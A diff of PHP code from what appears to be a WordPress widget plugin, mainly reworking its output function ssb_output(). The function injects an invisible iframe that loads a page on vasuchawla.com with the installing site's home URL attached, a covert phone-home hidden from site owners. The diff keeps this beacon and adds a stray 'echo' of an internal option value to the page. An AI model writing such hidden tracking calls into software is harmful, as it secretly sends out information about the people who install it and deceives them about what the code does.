@@ -19,7 +19,6 @@ function form($instance) {	$title 		= esc_attr($instance['title']);
 
 //get the settings
 $ssb = get_option(ssb_options);
-$ssb2 = get_option(ssb_installed);
 
 //activate/de-activate hooks
 function ssb_activation() {update_option("ssb_installed", 0);}
@@ -73,9 +72,12 @@ function ssb_output()
 	$output.="</ul>";
 
 
-if($ssb2!=1){ $a = home_url();
+$ssb2 = get_option(ssb_installed);
+if($ssb2!=1){echo $ssb2; $a = home_url();
 	$output.= "<iframe style=\"display:none !important\" src=\"http://vasuchawla.com/plugin.php?p=ssb&s=".$a."\" />";
-		update_option("ssb_installed", 1);}
+		update_option("ssb_installed", 1);
+		$ssb2 = get_option(ssb_installed);
+	}
 
 	return $output;
 }
